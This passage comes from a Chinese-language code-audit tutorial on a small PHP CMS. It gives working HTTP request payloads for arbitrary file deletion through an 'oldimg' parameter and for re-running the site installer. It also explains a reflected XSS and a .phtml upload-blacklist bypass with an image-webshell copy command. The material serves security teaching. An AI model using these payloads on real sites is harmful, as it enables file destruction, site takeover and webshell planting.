    POST /user/adv.php?action=modify HTTP/1.1
    Host: 192.168.1.7
    Content-Length: 149
    Cache-Control: max-age=0
    Origin: http://192.168.1.7
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36
    Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Referer: http://192.168.1.7/user/adv.php
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: bdshare_firstime=1518262531074; PHPSESSID=jpeu0l4983924s20f6bk0ktkl0;
    Connection: close
    adv=tettste&advlink=/zt/show.php?id=1&company=测试&img=test&oldimg=admin/admin.php&Submit3=%E5%8F%91%E5%B8%83
同样的漏洞发生在" **/user/licence_save.php** "30多行处
    # "/user/licence_save.php"文件
    ........
    if ($oldimg<>$img && $oldimg<>"/image/nopic.gif"){
        $f="../".$oldimg;
        if (file_exists($f)){
            unlink($f);
        }
      ........
    }
    ........
payload如下：
    POST /user/licence_save.php?action=modify HTTP/1.1
    Host: 192.168.1.7
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36
    Upgrade-Insecure-Requests: 1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: bdshare_firstime=1518262531074; PHPSESSID=jpeu0l4983924s20f6bk0ktkl0; 
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 35
    id=1&oldimg=admin/admin.php&img=t
该漏洞还存在于" **/user/manage.php** "、" **/user/ppsave.php** "、"
**/user/zssave.php** "、等文件中。
#### 网站重装漏洞
来看一下" **/install/index.php** "文件的代码流程，发现这里并没有检测" **/install/install.lock**
"文件是否存在，那应该是在其他文件中。
    # "/install/index.php"文件
然而发现，只有" **/install/step_1.php** "文件在开头有检测" **/install/install.lock**
"文件是否存在（存在表示已经安装过），其他" **/install/step_2.php** "、" **/install/step_3.php** "、"
**/install/step_4.php** "、" **/install/step_5.php** "、"
**/install/step_6.php** "都少了该判断导致该漏洞的发生。
    # "/install/step_1.php"文件
    if(file_exists("install.lock")){
        echo "安装向导已运行安装过，如需重安装，请删除 /install/install.lock 文件";
    }
所以我们可以跳过第一步的检测，直接访问" **/install/step_2.php** "文件，payload如下：
    POST /install/index.php HTTP/1.1
    Host: 192.168.1.7
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36
    Upgrade-Insecure-Requests: 1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: bdshare_firstime=1518262531074;
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 15
    step=2
#### 反射型XSS
该漏洞出现在" **/inc/top.php** "文件中，需要用户登录方可利用。之前的大部分文件都会在开头包含" **/inc/conn.php**
"文件，对REQUEST数据进行消毒处理，而这个文件没有，从而导致漏洞的发生。我们只需要将标签闭合即可实现反射型xss。
    # "/inc/top.php"文件
同样的漏洞还出现在" **/uploadimg_form.php** "文件66-67行处，这里不赘述。
#### 文件上传漏洞
" **/uploadimg_form.php**
"文件提供了一个文件上传的功能，然而这里没有过滤好，导致可以上传webshell。我们可以来看一下后端代码是如何进行验证的。
    # "/uploadimg.php"文件
    function upfile() {
        //文件是否存在
        if (!is_uploaded_file(@$this->fileName[tmp_name])){
            echo ""; exit;
        }
        //检查文件大小
        if ($this->max_file_size*1024 fileName["size"]){
            echo "";exit;
        }
        //检查文件类型
        if (!in_array($this->fileName["type"], $this->uptypes)) {
            echo "";exit;
        }
        //检查文件后缀
        $hzm=strtolower(substr($this->fileName["name"],strpos($this->fileName["name"],".")));//获取.后面的后缀，如可获取到.php.gif
        if (strpos($hzm,"php")!==false || strpos($hzm,"asp")!==false ||strpos($hzm,"jsp")!==false){
            echo "";exit;
        }
        ......
    }
首先，先判断文件是否存在，再检查文件是否超过限制，接着检查文件类型，这里可以用GIF89a绕过检查，最后使用黑名单机制检查文件后缀，问题就出在这里，黑名单少过滤了phtml，而apache会将phtml文件按照php文件来解析。所以我们可以构造payload如下，当然，使用copy命令生成的图片木马也可以绕过（例如：copy
test.jpg/b+test.php shell.jpg）。
### 结束语
当然，大家也可以使用其他的审计工具进行辅助，只要适合自己，有利于审计即可。虽然这是一个小cms，但是对于代码审计的新手来说，就是要多读、多看、多想。审计小cms的过程，就是在积累经验的过程，更是对我们将来审计大型框架进行铺垫。这里推荐大家一本书《代码审计
--企业级Web代码安全架构》，然后多看看网络上代码审计的案例，最重要的，还要自己动手审计一遍，希望这些技巧能够对你学习代码审计有所帮助。  
PS：以上内容节选自团队期刊 [红日安全-特刊-技术年货](https://mp.weixin.qq.com/s/UGbZYh3-sGgt89VIO3AhVA)